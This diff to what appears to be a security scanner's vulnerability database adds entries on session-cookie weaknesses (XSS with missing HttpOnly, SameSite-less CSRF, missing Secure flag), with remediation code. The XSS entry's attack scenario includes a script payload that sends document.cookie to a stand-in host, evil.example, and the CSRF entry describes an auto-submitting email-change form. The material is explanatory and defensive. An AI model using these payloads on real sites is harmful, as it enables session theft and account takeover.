@@ -3778,6 +3778,152 @@ MASS_ASSIGNMENT_EXPOSURE: VulnEntry = {
 
 
 # ---------------------------------------------------------------------------
+# Vector-based session-cookie knowledge entries
+# ---------------------------------------------------------------------------
+
+SESSION_XSS_STEALS: VulnEntry = {
+    "summary": (
+        "The session cookie is missing the HttpOnly flag, AND a reflected "
+        "XSS primitive exists on the same origin. An attacker can run "
+        "arbitrary JavaScript in a victim's browser, read document.cookie, "
+        "and steal the session — full account takeover."
+    ),
+    "technical": (
+        "The HttpOnly flag instructs browsers to forbid JavaScript from reading "
+        "the cookie via document.cookie. Without it, ANY XSS on the same origin "
+        "becomes a session hijack. The XSS check confirmed that benign canary "
+        "input is reflected unescaped into the response, demonstrating a "
+        "reachable XSS primitive. The attacker chain: 1) find a reflection "
+        "point (search field, error page, comment field), 2) craft a URL with "
+        "a payload like `<script>fetch('https://evil.example/?c='+document.cookie)</script>`, "
+        "3) trick the victim into clicking, 4) browser executes the script in "
+        "the target's origin, 5) cookie value sent to attacker's server."
+    ),
+    "attack_scenario": (
+        "1. Attacker discovers reflection at `https://target.example/search?q=test`\n"
+        "2. Attacker crafts URL with payload: `https://target.example/search?q=<script>fetch('https://evil.example/c?'+document.cookie)</script>`\n"
+        "3. Victim (logged into target) clicks link, lands on target\n"
+        "4. Browser executes the script, reads `document.cookie` (HttpOnly missing → readable)\n"
+        "5. Script POSTs cookie to attacker's server\n"
+        "6. Attacker replays cookie — full account takeover\n"
+        "Severity is CRITICAL because both XSS and missing HttpOnly are CONFIRMED."
+    ),
+    "impact": (
+        "Session hijacking leading to full account takeover. The attacker "
+        "can perform any action the victim can: change passwords, transfer "
+        "funds, exfiltrate data, send messages as the victim. Modern defenses "
+        "like CSP and SameSite cookies mitigate but don't replace HttpOnly."
+    ),
+    "remediation": [
+        "Set HttpOnly on the session cookie. This is the primary fix.",
+        "Also fix the underlying XSS by HTML-encoding user input and setting Content-Security-Policy.",
+        "Set SameSite=Strict or Lax to reduce CSRF surface.",
+        "Consider token binding (Cookie-to-header binding) for high-security apps.",
+    ],
+    "code_examples": {
+        "python-flask": "resp.set_cookie('session', token, httponly=True, secure=True, samesite='Strict')",
+        "express": "res.cookie('session', token, { httpOnly: true, secure: true, sameSite: 'strict' })",
+        "java": "Cookie c = new Cookie('session', token); c.setHttpOnly(true); c.setSecure(true); c.setAttribute('SameSite', 'Strict');",
+        "nginx": 'proxy_cookie_path / "/; HttpOnly; Secure; SameSite=Strict";',
+    },
+}
+
+
+SESSION_CSRF_CHAIN: VulnEntry = {
+    "summary": (
+        "The session cookie has no SameSite attribute (or SameSite=None) AND "
+        "XSS is exploitable on the same origin. An attacker can perform "
+        "cross-site request forgery via XSS-injected forms, bypassing the "
+        "CSRF protection that SameSite normally provides."
+    ),
+    "technical": (
+        "SameSite=Lax (the modern browser default for unset SameSite) blocks "
+        "the cookie from being sent on cross-site POST requests. SameSite=None "
+        "explicitly allows the cookie on any cross-site request. When XSS is "
+        "possible on the same origin, an attacker can host a page that contains "
+        "a form auto-submitting to the target (CSRF). If the cookie has "
+        "SameSite=None or is unset on older browsers, the request goes "
+        "through with the victim's session. The XSS primitive is what makes "
+        "this exploitable — without XSS, the attacker can't host the form on "
+        "the right origin."
+    ),
+    "attack_scenario": (
+        "1. Attacker hosts `https://evil.example/csrf.html` with a hidden form that POSTs to `https://target.example/account/change-email`\n"
+        "2. Form has hidden input: `<input name='new_email' value='attacker@evil.example'>`\n"
+        "3. JavaScript auto-submits the form on page load\n"
+        "4. If SameSite is None/unset, victim's browser sends the session cookie with the cross-origin POST\n"
+        "5. Target processes the request in the victim's session — email changed\n"
+        "6. Attacker does password reset to attacker's email → account takeover"
+    ),
+    "impact": (
+        "CSRF attacks enable state-changing actions performed in the victim's "
+        "authenticated session: change email or password (enabling full account "
+        "takeover), transfer funds between accounts, post content as the victim, "
+        "follow or unfollow accounts, delete or modify data, and trigger other "
+        "destructive workflows. The attack is invisible to the victim — the "
+        "request appears to come from their own browser. Combined with the XSS "
+        "primitive that the engine also detected, the attack surface widens "
+        "significantly: the attacker can host the CSRF form on the XSS-injectable "
+        "page, chaining two browser-side primitives into a single reliable "
+        "exploit. Even a one-time CSRF can be sufficient: changing the recovery "
+        "email lets the attacker reset the victim's password and gain full control."
+    ),
+    "remediation": [
+        "Set SameSite=Strict (or Lax if you need cross-site GET) on all session cookies.",
+        "Fix the underlying XSS to remove the attack chain.",
+        "Use CSRF tokens on state-changing endpoints as defense-in-depth.",
+    ],
+    "code_examples": {
+        "python-flask": "resp.set_cookie('session', token, samesite='Strict', httponly=True, secure=True)",
+        "express": "res.cookie('session', token, { sameSite: 'strict', httpOnly: true, secure: true })",
+        "java": "c.setAttribute('SameSite', 'Strict');  // Requires Servlet 4.0+",
+    },
+}
+
+
+SESSION_MITM_EXPOSURE: VulnEntry = {
+    "summary": (
+        "The HTTPS-served session cookie is missing the Secure flag. When the "
+        "browser makes a same-site request that downgrades to HTTP (e.g., a "
+        "legacy resource, a typo'd URL, an attacker-controlled redirect), "
+        "the session cookie is sent in plaintext. A network attacker can read "
+        "it."
+    ),
+    "technical": (
+        "The Secure flag tells the browser to only send the cookie over HTTPS. "
+        "Without it, the browser sends the cookie on any request to the cookie's "
+        "domain — including plaintext HTTP. An attacker on the same network "
+        "(public WiFi, ARP spoofing, ISP) can intercept the plaintext request "
+        "and read the cookie. Even with HSTS, a single HTTP request before the "
+        "HSTS header is received, or a sub-domain HTTP request, leaks the cookie."
+    ),
+    "attack_scenario": (
+        "1. Victim uses `https://target.example/dashboard` — gets session cookie (Secure flag not set)\n"
+        "2. Victim clicks link to `http://target.example/legacy` (note: HTTP, not HTTPS) — or attacker sends them there\n"
+        "3. Browser includes the session cookie with the plaintext HTTP request\n"
+        "4. Attacker on the network captures the request, extracts the cookie\n"
+        "5. Attacker replays cookie from their machine — session hijacked"
+    ),
+    "impact": (
+        "Session token exposure to any network attacker between victim and "
+        "target. On public WiFi, this is trivial. Even on trusted networks, "
+        "compromised routers or insider threats can capture the cookie."
+    ),
+    "remediation": [
+        "Set Secure flag on all session cookies.",
+        "Enable HSTS with includeSubDomains and preload.",
+        "Redirect all HTTP requests to HTTPS at the load balancer / reverse proxy.",
+        "Set Secure flag on the cookie at the framework level, not per-cookie.",
+    ],
+    "code_examples": {
+        "python-flask": "resp.set_cookie('session', token, secure=True, httponly=True, samesite='Strict')",
+        "express": "res.cookie('session', token, { secure: true, httpOnly: true, sameSite: 'strict' })",
+        "nginx": "proxy_cookie_flags ~ secure; httponly; SameSite=Strict;",
+    },
+}
+
+
+# ---------------------------------------------------------------------------
 # Master registry
 # ---------------------------------------------------------------------------
 
@@ -3849,8 +3995,13 @@ VULN_DB: dict[tuple[str, str], VulnEntry] = {
     ("session-cookie", "cookie_secure_missing"): COOKIE_SECURE_MISSING,
     ("session-cookie", "cookie_samesite_missing"): COOKIE_SAMESITE_MISSING,
     ("session-cookie", "weak_session_token"): WEAK_SESSION_TOKEN,
+    ("session-cookie", "session_weak_token"): WEAK_SESSION_TOKEN,
     ("session-cookie", "token_in_url"): TOKEN_LEAKAGE,
+    ("session-cookie", "token_in_response_body"): TOKEN_LEAKAGE,
     ("session-cookie", "session_fixation_indicator"): SESSION_FIXATION_INDICATOR,
+    ("session-cookie", "session_xss_steals"): SESSION_XSS_STEALS,
+    ("session-cookie", "session_csrf_chain"): SESSION_CSRF_CHAIN,
+    ("session-cookie", "session_mitm_exposure"): SESSION_MITM_EXPOSURE,
 
     # bola-idor
     ("bola-idor", "bola"): BOLA_IDOR,
